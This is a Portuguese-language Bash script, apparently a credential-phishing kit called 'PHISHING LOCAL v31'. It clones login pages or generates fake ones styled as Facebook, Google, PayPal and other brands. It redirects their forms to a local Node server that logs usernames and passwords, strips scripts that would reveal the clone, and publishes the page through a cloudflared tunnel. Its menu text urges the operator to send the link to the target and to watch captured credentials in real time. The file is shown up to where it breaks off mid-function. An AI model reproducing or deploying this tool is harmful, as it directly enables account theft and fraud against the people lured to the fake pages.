#!/bin/bash
# ============================================
# 🎣 PHISHING LOCAL v31 - Clonador Profissional
# 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Parar 0 Sair
# ============================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Verificar se existe o server.js
if [ ! -f "$SCRIPT_DIR/server/server.js" ]; then
    echo -e "${RED}[ERRO] server.js não encontrado em $SCRIPT_DIR/server/${NC}"
    echo -e "${YELLOW}Verifique se o arquivo existe e rode novamente.${NC}"
    exit 1
fi
SITE_DIR="$SCRIPT_DIR/site_clone"
LOG_FILE="$SCRIPT_DIR/capturas.txt"
CAPTURED_DIR="$SCRIPT_DIR/captured_sites"

mkdir -p "$CAPTURED_DIR" "$SITE_DIR"

# =============================================
# VERIFICAR NODE.JS
# =============================================
if ! command -v node &>/dev/null; then
    echo -e "${YELLOW}[...] Node.js não encontrado. Instalando...${NC}"
    pkg install -y nodejs 2>/dev/null || {
        echo -e "${RED}[ERRO] Falha ao instalar Node.js. Instale manualmente:${NC}"
        echo -e "${WHITE}  pkg install nodejs${NC}"
        exit 1
    }
fi

# =============================================
# OBTER IP AUTOMÁTICO
# =============================================
get_my_ip() {
    local ip=""
    ip=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    if [ -z "$ip" ]; then
        ip=$(ip addr 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
    fi
    [ -z "$ip" ] && ip="127.0.0.1"
    echo "$ip"
}

# =============================================
# CLONAR SITE - BAIXA TUDO, MANTEM ORIGINAL
# =============================================
clone_site() {
    local target_url="$1"
    local redirect_url="$2"
    local port="${3:-8080}"

    rm -rf "$SITE_DIR"/*

    # curl com proxychains se disponível e configurado (ou se PROXY_CHAINS_CONF setado)
    local curl_cmd="curl"
    local curl_opts="-s -L -k --connect-timeout 20 --max-time 60"
    local proxychains_conf="${PROXY_CHAINS_CONF:-}"
    if [ -z "$proxychains_conf" ]; then
        if [ -f "$HOME/.proxychains/proxychains.conf" ]; then
            proxychains_conf="$HOME/.proxychains/proxychains.conf"
        elif [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ]; then
            proxychains_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
        fi
    fi
    if command -v proxychains4 &>/dev/null && [ -n "$proxychains_conf" ]; then
        curl_cmd="proxychains4 -f $proxychains_conf curl"
        echo -e "${GREEN}[ProxyChains ativo]${NC}"
    else
        echo -e "${YELLOW}[Sem proxy — direto]${NC}"
    fi

    # Detectar redirect: pega a URL final após redirects
    local final_url=$($curl_cmd -sI -L -k --connect-timeout 15 "$target_url" 2>/dev/null | grep -i "^location:" | tail -1 | sed 's/location: //i' | tr -d '
')
    if [ -n "$final_url" ] && ! echo "$final_url" | grep -q "^$target_url"; then
        echo -e "${YELLOW}[Redirect detectado: $final_url${NC}"
        target_url="$final_url"
        # Extrair novo domínio base
        base_domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\1|')
    fi

    local ua="Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
    local accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    local lang="pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"

    # 1. Baixar HTML principal (com delay pra esperar redirect/carregar)
    echo -e "${YELLOW}[1/4] Baixando HTML (aguardando carregar)...${NC}"
    sleep 3
    $curl_cmd $curl_opts -H "$ua" -H "Accept: $accept" -H "Accept-Language: $lang" -H "Accept-Encoding: identity" -o "$SITE_DIR/index.html" "$target_url" > "$SCRIPT_DIR/curl.log" 2>&1

    if [ ! -s "$SITE_DIR/index.html" ]; then
        echo -e "${RED}[ERRO] Falha ao baixar o site.${NC}"
        cat "$SCRIPT_DIR/curl.log" 2>/dev/null
        return 1
    fi
    local html_size=$(wc -c < "$SITE_DIR/index.html")
    echo -e "${GREEN}  → ${html_size} bytes${NC}"

    # Detectar SPA (Angular/React/Vue) — impossível clonar funcional
    local base_domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\\1|')
    local is_spa=0
    local spa_type=""
    grep -qi 'app-root\|_nghost\|__NEXT_DATA__\|data-reactroot\|ng-version\|vue-router' "$SITE_DIR/index.html" 2>/dev/null && is_spa=1
    grep -qi 'app-root\|_nghost\|ng-version' "$SITE_DIR/index.html" 2>/dev/null && spa_type="Angular"
    grep -qi '__NEXT_DATA__\|__next' "$SITE_DIR/index.html" 2>/dev/null && spa_type="Next.js"
    grep -qi 'data-reactroot\|react' "$SITE_DIR/index.html" 2>/dev/null && spa_type="React"
    grep -qi 'vue-router\|vue.js' "$SITE_DIR/index.html" 2>/dev/null && spa_type="Vue.js"

    if [ "$is_spa" = "1" ]; then
        echo -e "  ${RED}⚠ SPA detectado: ${spa_type}${NC}"
        echo -e "  ${YELLOW}→ Gerando página fake funcional${NC}"
        # Baixar favicon/logo
        local favicon="$($curl_cmd $curl_opts -sI -L "${base_domain}/favicon.ico" 2>/dev/null | grep -i 'content-type.*image' || echo '')"
        $curl_cmd $curl_opts -s -o "$SITE_DIR/favicon.png" "${base_domain}/favicon.ico" 2>/dev/null
        $curl_cmd $curl_opts -s -o "$favicon" "${base_domain}/favicon.ico" 2>/dev/null

        # Buscar logo no header
        local logo_url=$(grep -oE 'src="[^"]*logo[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | head -1 | sed 's/src="//;s/"//')
        [ -z "$logo_url" ] && logo_url=$(grep -oE 'href="[^"]*logo[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | head -1 | sed 's/href="//;s/"//')
        if [ -n "$logo_url" ]; then
            local logo_abs=""
            echo "$logo_url" | grep -q "^http" && logo_abs="$logo_url"
            echo "$logo_url" | grep -q "^//" && logo_abs="https:$logo_url"
            [ -z "$logo_abs" ] && logo_abs="${base_domain}${logo_url}"
            $curl_cmd $curl_opts -s -o "$SITE_DIR/logo.png" "$logo_abs" 2>/dev/null
        fi

        # Extrair nome do domínio pra label
        local site_name=$(echo "$target_url" | sed -E 's|https?://||;s|[^a-zA-Z0-9].||g; s|www\.||' | cut -c1-20)
        local main_color="#3897f0"
        if grep -qiE 'facebook\.com|fb\.com' "$SITE_DIR/index.html"; then
            main_color="#1877f2"
            site_name="Facebook"
        elif grep -qiE 'google\.com' "$SITE_DIR/index.html"; then
            main_color="#4285f4"
            site_name="Google"
        elif grep -qiE 'twitter\.com|x\.com' "$SITE_DIR/index.html"; then
            main_color="#1da1f2"
            site_name="Twitter"
        elif grep -qiE 'netflix\.com' "$SITE_DIR/index.html"; then
            main_color="#e50914"
            site_name="Netflix"
        elif grep -qiE 'amazon\.com' "$SITE_DIR/index.html"; then
            main_color="#ff9900"
            site_name="Amazon"
        elif grep -qiE 'linkedin\.com' "$SITE_DIR/index.html"; then
            main_color="#0077b5"
            site_name="LinkedIn"
        elif grep -qiE 'discord\.com' "$SITE_DIR/index.html"; then
            main_color="#5865f2"
            site_name="Discord"
        elif grep -qiE 'github\.com' "$SITE_DIR/index.html"; then
            main_color="#333333"
            site_name="GitHub"
        elif grep -qiE 'paypal\.com' "$SITE_DIR/index.html"; then
            main_color="#003087"
            site_name="PayPal"
        elif grep -qiE 'spotify\.com' "$SITE_DIR/index.html"; then
            main_color="#1db954"
            site_name="Spotify"
        elif grep -qiE 'telegram\.org|t\.me' "$SITE_DIR/index.html"; then
            main_color="#0088cc"
            site_name="Telegram"
        fi

        # Criar página fake
        cat > "$SITE_DIR/index.html" << ENDHTML
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar - ${site_name}</title>
    <link rel="icon" href="favicon.png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            direction: ltr;
        }
        .container {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px;
            width: 350px;
            max-width: 90vw;
            text-align: center;
            margin: 10px;
        }
        .logo { margin-bottom: 20px; }
        .logo img { max-width: 170px; max-height: 80px; }
        .site-title {
            font-size: 28px;
            font-weight: 300;
            color: #262626;
            margin: 10px 0 5px;
        }
        .subtitle {
            font-size: 14px;
            color: #8e8e8e;
            margin-bottom: 24px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 4px 0;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 14px;
            background: #fafafa;
        }
        input:focus { outline: none; border-color: ${main_color}; }
        button {
            width: 100%;
            padding: 10px;
            margin: 12px 0;
            background: ${main_color};
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            opacity: 0.9;
        }
        button:hover { opacity: 1; }
        .divider {
            margin: 18px 0;
            font-size: 13px;
            color: #8e8e8e;
            text-transform: uppercase;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="logo.png" alt="${site_name}" onerror="this.style.display='none'">
            <div class="site-title">${site_name}</div>
            <div class="subtitle">Entrar na sua conta</div>
        </div>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Usuário, email ou telefone" required>
            <input type="password" name="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
        <div class="divider">ou</div>
        <div class="footer">
            <a href="#" onclick="return false;" style="color:#3897f0;text-decoration:none;">Esqueceu a senha?</a>
        </div>
    </div>
</body>
</html>
ENDHTML

        # Limpar recursos não usados no modo FAKE
        rm -f "$SITE_DIR"/css_*.css "$SITE_DIR"/js_*.js "$SITE_DIR"/asset_* 2>/dev/null
        echo -e "  ${GREEN}✓ Página fake gerada (${site_name})${NC}"

        # Pular resto do processo de clone tradicional
        local skip_traditional=1
    else
        local skip_traditional=0
    fi

    if [ "$skip_traditional" = "1" ]; then
        # Pular direto pro server startup
        local final_url="$local_url"
    fi

    if [ "$html_size" -lt 5000 ] && [ "$is_spa" != "1" ]; then
        echo -e "${YELLOW}  ⚠ HTML muito pequeno (site pode ter bloqueio)${NC}"
    fi

    if [ "$is_spa" != "1" ]; then
    # Extrair domínio base (só faz sentido se não for SPA)
    local base_domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\\1|')

    local my_ip=$(get_my_ip)
    local local_url="http://${my_ip}:${port}"

    # 2. Baixar CSS — pega todos <link rel="stylesheet"> e também href com .css
    echo -e "${YELLOW}[2/4] Baixando CSS...${NC}"
    local css_count=0
    local css_list_file="$SCRIPT_DIR/.css_list"
    # Pegar todos os links de CSS (qualquer href que contenha .css)
    grep -oE 'href="[^"]*\.css[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//' | sort -u > "$css_list_file"
    # Também pegar <link> com href que NÃO termina em .css mas é CSS (style.min, etc)
    grep -oE '<link[^>]*href="[^"]*"[^>]*>' "$SITE_DIR/index.html" 2>/dev/null | grep -iE "stylesheet|text/css|content=\"style" | sed -n 's/.*href="\([^"]*\)".*/\1/p' | sort -u >> "$css_list_file"
    # Duplicatas
    sort -u "$css_list_file" -o "$css_list_file"
    while IFS= read -r css_url; do
        [ -z "$css_url" ] && continue
        local css_file="css_${css_count}_$(basename "$css_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-50)"
        local css_abs=""
        if echo "$css_url" | grep -q "^http"; then
            css_abs="$css_url"
        elif echo "$css_url" | grep -q "^//"; then
            css_abs="https:$css_url"
        elif echo "$css_url" | grep -q "^/"; then
            css_abs="${base_domain}${css_url}"
        else
            css_abs="${base_domain}/${css_url}"
        fi
        $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "$css_abs" >> "$SCRIPT_DIR/curl.log" 2>&1
        # Trocar no HTML usando perl (literal, sem regex issues)
        perl -i -pe "s|\Q${css_url}\E|${css_file}|g" "$SITE_DIR/index.html"
        # Também substituir versão absoluta
        local abs1="${base_domain}${css_url}"
        [ "$abs1" != "$css_url" ] && perl -i -pe "s|\Q${abs1}\E|${css_file}|g" "$SITE_DIR/index.html"
        css_count=$((css_count + 1))
    done < "$css_list_file"
    rm -f "$css_list_file"
    echo -e "${GREEN}  → ${css_count} CSS baixados${NC}"

    # 3. Baixar JS — pega src="..." com .js
    echo -e "${YELLOW}[3/4] Baixando JS...${NC}"
    local js_count=0
    local js_list_file="$SCRIPT_DIR/.js_list"
    grep -oE 'src="[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//' > "$js_list_file"
    # Também URLs relativos (src="//...")
    grep -oE 'src="//[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//|https://|' >> "$js_list_file"
    sort -u "$js_list_file" -o "$js_list_file"
    while IFS= read -r js_url; do
        [ -z "$js_url" ] && continue
        local js_file="js_${js_count}_$(basename "$js_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-40)"
        local js_abs=""
        if echo "$js_url" | grep -q "^http"; then
            js_abs="$js_url"
        elif echo "$js_url" | grep -q "^//"; then
            js_abs="https:$js_url"
        elif echo "$js_url" | grep -q "^/"; then
            js_abs="${base_domain}${js_url}"
        else
            js_abs="${base_domain}/${js_url}"
        fi
        $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "$js_abs" >> "$SCRIPT_DIR/curl.log" 2>&1
        # Trocar no HTML usando perl (literal)
        perl -i -pe "s|\Q${js_url}\E|${js_file}|g" "$SITE_DIR/index.html"
        js_count=$((js_count + 1))
    done < "$js_list_file"
    rm -f "$js_list_file"
    echo -e "${GREEN}  → ${js_count} JS baixados${NC}"

    # 4. Modificar formulários pra captura
    echo -e "${YELLOW}[4/4] Configurando captura...${NC}"

    # Capturar action original e redirecionar pra /login
    sed -i 's/action="[^"]*"/action="\/login"/gI' "$SITE_DIR/index.html"
    # Garantir method POST
    sed -i 's/<form\b/<form method="POST" action="\/login"/gI' "$SITE_DIR/index.html"
    # Extrair domínios do site pra trocar todos
    local domain_plain=$(echo "$base_domain" | sed 's|https\?://||')
    local domain_www="www.${domain_plain}"

    # 3.5 Baixar recursos do CDN (imagens, fonts, webp, etc)
    echo -e "${YELLOW}[3.5] Baixando recursos do CDN...${NC}"
    local asset_count=0
    > "$SCRIPT_DIR/.assets_list"
    # Assets com https:// em atributos src/href
    grep -oE '(src|href|action)="https?://[^"]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | cut -d'"' -f2 >> "$SCRIPT_DIR/.assets_list"
    # URLs relativos com //
    grep -oE '"//[^"]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | cut -c3- >> "$SCRIPT_DIR/.assets_list"
    # Do CSS
    for css_file in "$SITE_DIR"/css_*.css; do
        [ -f "$css_file" ] || continue
        grep -oE 'url\([^)]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^)]*\)' "$css_file" 2>/dev/null | sed 's/url(//;s/).*//;s/#.*//;s/["'"'"' ]//g' >> "$SCRIPT_DIR/.assets_list"
    done
    sort -u "$SCRIPT_DIR/.assets_list" > "$SCRIPT_DIR/.assets_list_sorted"
    while IFS= read -r asset_url; do
        asset_url=$(echo "$asset_url" | sed 's|"||g')
        [ -z "$asset_url" ] && continue
        local asset_file="asset_${asset_count}_$(basename "$asset_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-50)"
        $curl_cmd -s -o "$SITE_DIR/$asset_file" "$asset_url" >> "$SCRIPT_DIR/curl.log" 2>&1
        asset_count=$((asset_count + 1))
    done < "$SCRIPT_DIR/.assets_list_sorted"
    rm -f "$SCRIPT_DIR/.assets_list" "$SCRIPT_DIR/.assets_list_sorted"
    echo -e "${GREEN}  → ${asset_count} assets baixados${NC}"

    # Coletar domínios CDN ANTES de qualquer substituição
    local cdn_domains=$(grep -oE 'https://[^./]+\.[^./]+\.com' "$SITE_DIR/index.html" 2>/dev/null | sort -u)
    # Detectar todos os domínios http/https do HTML (que NÃO sejam nosso placeholder ou domínio-origem)
    
    # Trocar URLs do domínio original por IP local — usar placeholder pra evitar loops
    local placeholder="___MYLOCALIP___"
    perl -i -pe "s|\Q${base_domain}\E|${placeholder}|g" "$SITE_DIR/index.html"
    # Trocar www.dominio.com e dominio.com (com e sem https)
    perl -i -pe "s|\Qhttps://${domain_plain}\E|${placeholder}|g" "$SITE_DIR/index.html"
    perl -i -pe "s|\Qhttp://${domain_plain}\E|${placeholder}|g" "$SITE_DIR/index.html"
    perl -i -pe "s|\Qhttps://${domain_www}\E|${placeholder}|g" "$SITE_DIR/index.html"
    perl -i -pe "s|\Qhttp://${domain_www}\E|${placeholder}|g" "$SITE_DIR/index.html"
    # Trocar URLs que começam com // (protocol-relative)
    perl -i -pe "s|//${domain_plain}/|${placeholder}/|g" "$SITE_DIR/index.html"
    perl -i -pe "s|//${domain_www}/|${placeholder}/|g" "$SITE_DIR/index.html"
    # Trocar CDN
    for cdn in $cdn_domains; do
        local cdn_host=$(echo "$cdn" | sed 's|https\?://||')
        perl -i -pe "s|\Q//${cdn_host}\E|${placeholder}|g" "$SITE_DIR/index.html"
        perl -i -pe "s|\Q${cdn_host}\E|${placeholder}|g" "$SITE_DIR/index.html"
        for css_file in "$SITE_DIR"/css_*.css; do
            [ -f "$css_file" ] || continue
            perl -i -pe "s|\Q//${cdn_host}\E|${placeholder}|g" "$css_file"
            perl -i -pe "s|\Q${cdn_host}\E|${placeholder}|g" "$css_file"
        done
    done
    # Trocar placeholder pelo URL real
    sed -i "s|${placeholder}|${local_url}|g" "$SITE_DIR/index.html"
    # Remover integrações externas que denunciam clone
    sed -i 's/<script[^>]*src="https:\/\/connect\.facebook\.net[^"]*"[^>]*><\/script>//gI' "$SITE_DIR/index.html"
    sed -i 's/<script[^>]*src="https:\/\/platform\.twitter\.com[^"]*"[^>]*><\/script>//gI' "$SITE_DIR/index.html"
    # Corrigir http -> https reverso (mixed content)
    sed -i "s|http://${my_ip}|${local_url}|gI" "$SITE_DIR/index.html"

    echo -e "${GREEN}  → Formulários hackeados, URLs trocadas${NC}"
    fi  # fim do if is_spa != 1

    # Salvar no histórico (independente de SPA ou não)
    # Extrair nome do domínio pra label (se ainda não foi)
    local site_name=$(echo "$target_url" | sed -E 's|https?://||;s|[^a-zA-Z0-9.]|_|g')
    local ts=$(date +%Y%m%d_%H%M)
    local hist_dir="$CAPTURED_DIR/${site_name}_${ts}"
    mkdir -p "$hist_dir"
    cp -r "$SITE_DIR"/* "$hist_dir"/ 2>/dev/null

    # Salvar no histórico (arquivo)
    echo "${target_url}|${redirect_url}|${port}|$(date '+%Y-%m-%d %H:%M')|$hist_dir" >> "$SCRIPT_DIR/.history"

    echo ""
    echo -e "  ✅ CLONE REALIZADO!"
    echo -e "  📍 http://${my_ip}:${port}"

    # Matar qualquer processo na porta antes de iniciar
    echo -e "${YELLOW}[...] Iniciando servidor na porta $port...${NC}"
    # Matar node antigo por nome
    pkill -9 -f "node.*server.js" 2>/dev/null
    sleep 1
    # Matar qualquer coisa na porta (tentar fuser)
    if command -v fuser &>/dev/null; then
        fuser -k "$port/tcp" 2>/dev/null
    elif command -v lsof &>/dev/null; then
        local old_pid=$(lsof -ti :$port 2>/dev/null)
        [ -n "$old_pid" ] && kill -9 $old_pid 2>/dev/null
    elif command -v netstat &>/dev/null; then
        local old_pid=$(netstat -tlnp 2>/dev/null | grep ":$port " | grep -oE '[0-9]+/node' | cut -d/ -f1)
        [ -n "$old_pid" ] && kill -9 $old_pid 2>/dev/null
    fi
    sleep 1

    cd "$SCRIPT_DIR"
    REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
    local pid=$!
    echo "$pid" > "$SCRIPT_DIR/.server.pid"
    sleep 3

    # Verificar se subiu
    if kill -0 "$pid" 2>/dev/null; then
        echo -e "${GREEN}[✓] Servidor rodando! PID: $pid${NC}"
        echo -e "${GREEN}[✓] Acesse: http://${my_ip}:${port}${NC}"
    else
        echo -e "${RED}[ERRO] Servidor não subiu. Log:${NC}"
        cat "$SCRIPT_DIR/server.log" 2>/dev/null
        rm -f "$SCRIPT_DIR/.server.pid"
    fi

    echo ""
    echo -e "${YELLOW}Pressione Enter para voltar ao menu...${NC}"
    read
}

# =============================================
# VER CAPTURAS - TEMPO REAL
# =============================================
view_captures() {
    clear
    echo -e "  ═══ 📋 CREDENCIAIS CAPTURADAS ═══"
    echo ""

    if [ ! -f "$LOG_FILE" ] || [ ! -s "$LOG_FILE" ]; then
        echo -e "${RED}  Nenhuma captura ainda.${NC}"
    else
        echo -e "${WHITE}═══════════════════════════════════════════${NC}"
        cat "$LOG_FILE"
        echo -e "${WHITE}═══════════════════════════════════════════${NC}"
        echo -e "${GREEN}  $(wc -l < "$LOG_FILE" | tr -d ' ') captura(s)${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Limpar capturas${NC}"
    echo -e "${YELLOW}2) Tempo real (Ctrl+C = voltar)${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    case $CHOICE in
        1)
            > "$LOG_FILE"
            echo -e "${GREEN}[✓] Limpo.${NC}"
            echo -e "${YELLOW}Enter...${NC}"
            read
            ;;
        2)
            echo -e "${CYAN}(Ctrl+C pra voltar)${NC}"
            tail -n 5 -f "$LOG_FILE" 2>/dev/null || true
            ;;
    esac
}

# =============================================
# TÚNEL CLOUDFLARED
# =============================================
start_tunnel() {
    clear
    echo -e "  ═══ 🌐 TÚNEL PÚBLICO ═══"
    echo ""

    # Verificar servidor
    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
        echo -e "${RED}  Servidor não está rodando! Faça phish primeiro.${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
    if ! kill -0 "$pid" 2>/dev/null; then
        echo -e "${RED}  Servidor parou. Faça phish de novo.${NC}"
        rm -f "$SCRIPT_DIR/.server.pid"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local port=$(grep 'PORT=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
    [ -z "$port" ] && port=8080

    # Verificar cloudflared
    if ! command -v cloudflared &>/dev/null; then
        echo -e "${YELLOW}  cloudflared não encontrado. Instale:${NC}"
        echo -e "${WHITE}  pkg install cloudflared${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    # Parar túnel anterior
    if [ -f "$SCRIPT_DIR/.tunnel.pid" ]; then
        kill $(cat "$SCRIPT_DIR/.tunnel.pid") 2>/dev/null
        rm -f "$SCRIPT_DIR/.tunnel.pid"
    fi
    pkill -f cloudflared 2>/dev/null
    sleep 1

    echo -e "${YELLOW}[...] Iniciando túnel na porta $port...${NC}"

    # Criar tunnel em background
    cloudflared tunnel --url "http://localhost:$port" > "$SCRIPT_DIR/.tunnel.log" 2>&1 &
    local tunnel_pid=$!
    echo "$tunnel_pid" > "$SCRIPT_DIR/.tunnel.pid"
    sleep 6

    # Capturar URL
    local tunnel_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$SCRIPT_DIR/.tunnel.log" 2>/dev/null | head -1)

    if [ -n "$tunnel_url" ] && [ "$tunnel_url" != "" ]; then
        echo -e "  🌐 PRONTO!"
        echo -e "  📍 $tunnel_url"
        echo ""
        echo -e "  💡 Mande pro alvo nesse link!"
    else
        echo -e "${YELLOW}  Túnel iniciado (demora alguns segundos).${NC}"
        echo -e "${YELLOW}  Verifique: cat $SCRIPT_DIR/.tunnel.log${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Parar${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    if [ "$CHOICE" = "1" ]; then
        [ -f "$SCRIPT_DIR/.tunnel.pid" ] && kill $(cat "$SCRIPT_DIR/.tunnel.pid") 2>/dev/null
        rm -f "$SCRIPT_DIR/.tunnel.pid"
        pkill -f cloudflared 2>/dev/null
        echo -e "${GREEN}[✓] Parado.${NC}"
    fi
}

# =============================================
# HISTÓRICO
# =============================================
show_history() {
    clear
    echo -e "  ═══ 📜 HISTÓRICO ═══"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.history" ] || [ ! -s "$SCRIPT_DIR/.history" ]; then
        echo -e "${RED}  Sem clones.${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local count=0
    local all_urls=()
    local all_redirects=()
    local all_ports=()
    local all_dirs=()
    while IFS='|' read -r url redirect port timestamp dir; do
        count=$((count + 1))
        all_urls+=("$url")
        all_redirects+=("$redirect")
        all_ports+=("$port")
        all_dirs+=("$dir")
        echo -e "  ${GREEN}[$count]${NC} ${WHITE}$url${NC} ($timestamp)"
    done < "$SCRIPT_DIR/.history"

    [ "$count" -eq 0 ] && return

    echo ""
    echo -e "  ${RED}[0]${NC} Voltar"
    echo -n "Escolha: "
    read CHOICE

    [ "$CHOICE" = "0" ] && return

    if [ "$CHOICE" -gt 0 ] 2>/dev/null && [ "$CHOICE" -le "$count" ]; then
        local idx=$((CHOICE - 1))
        echo ""
        echo -e "${GREEN}  ${all_urls[$idx]}${NC}"
        echo ""
        echo -e "${YELLOW}1) Reusar${NC}"
        echo -e "${YELLOW}2) Atualizar${NC}"
        echo -e "${YELLOW}Enter) Voltar${NC}"
        echo -n "> "
        read ACT

        [ -z "$ACT" ] && return

        if [ "$ACT" = "1" ]; then
            rm -rf "$SITE_DIR"/*
            cp -r "${all_dirs[$idx]}"/* "$SITE_DIR"/ 2>/dev/null
            # Atualizar IP
            local my_ip=$(get_my_ip)
            local port="${all_ports[$idx]}"
            sed -i "s|http://[0-9.]*:[0-9]*|http://${my_ip}:${port}|g" "$SITE_DIR/index.html"
            cd "$SCRIPT_DIR"
            REDIRECT_URL="${all_redirects[$idx]}" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" nohup node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
            echo "$!" > "$SCRIPT_DIR/.server.pid"
            echo -e "${GREEN}[✓] Servidor em http://${my_ip}:${port}${NC}"
        elif [ "$ACT" = "2" ]; then
            clone_site "${all_urls[$idx]}" "${all_redirects[$idx]}" "${all_ports[$idx]}"
        fi
    fi
}

# =============================================
# LOCALHOST - Mostrar IP e porta
# =============================================
show_localhost() {
    clear
    echo -e "  ═══ 📍 SERVIDOR LOCAL ═══"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
        echo -e "${RED}  Servidor OFF.${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
    if ! kill -0 "$pid" 2>/dev/null; then
        echo -e "${RED}  Servidor OFF (PID parou).${NC}"
        rm -f "$SCRIPT_DIR/.server.pid"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local port=$(grep 'PORT=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
    local my_ip=$(get_my_ip)
    local target=$(grep 'TARGET_URL=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
    local redirect=$(grep 'REDIRECT_URL=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)

    [ -z "$port" ] && port=8080

    echo -e "  ${GREEN}Status:${NC}  ${WHITE}ON ✓${NC}"
    echo -e "  ${GREEN}PID:${NC}     ${WHITE}$pid${NC}"
    echo -e "  ${GREEN}IP:${NC}      ${WHITE}$my_ip${NC}"
    echo -e "  ${GREEN}Porta:${NC}   ${WHITE}$port${NC}"
    echo -e "  ${GREEN}URL:${NC}     ${WHITE}http://${my_ip}:${port}${NC}"
    echo -e "  ${GREEN}Alvo:${NC}    ${WHITE}$target${NC}"
    echo -e "  ${GREEN}Redirect:${NC} ${WHITE}$redirect${NC}"
    echo ""
    echo -e "${YELLOW}Enter...${NC}"
    read
}

# =============================================
# LINK DO TÚNEL
# =============================================
show_tunnel_link() {
    clear
    echo -e "  ═══ 🔗 LINK DO TÚNEL ═══"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.tunnel.log" ] || [ ! -s "$SCRIPT_DIR/.tunnel.log" ]; then
        echo -e "${RED}  Túnel não está rodando.${NC}"
        echo -e "${YELLOW}  Crie o túnel primeiro (opção 3).${NC}"
        echo ""
        echo -e "${YELLOW}Enter...${NC}"
        read
        return
    fi

    local tunnel_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$SCRIPT_DIR/.tunnel.log" 2>/dev/null | head -1)

    if [ -n "$tunnel_url" ] && [ "$tunnel_url" != "" ]; then
        echo -e "  🌐 LINK PÚBLICO:"
        echo -e "  📍 $tunnel_url"
        echo ""
        echo -e "  💡 Manda esse link pro alvo!"
    else
